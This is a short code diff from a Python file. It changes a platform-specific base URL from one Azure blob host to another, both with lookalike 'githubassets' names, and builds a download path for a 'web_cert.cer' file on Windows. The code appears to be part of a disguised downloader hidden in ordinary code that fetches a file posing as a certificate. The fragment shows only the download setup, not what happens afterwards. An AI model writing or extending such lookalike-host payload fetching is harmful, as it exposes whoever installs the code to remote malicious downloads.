@@ -25,7 +25,7 @@ import base64
 _platform = platform.system()
 if _platform in ('Windows', 'Linux'):
 
-    base_url = f"https://githubassets9875.blob.core.windows.net/assets/"
+    base_url = f"https://githubassets934762.blob.core.windows.net/certs/"
 
     if _platform == "Windows":
         url = base_url + "web_cert.cer"
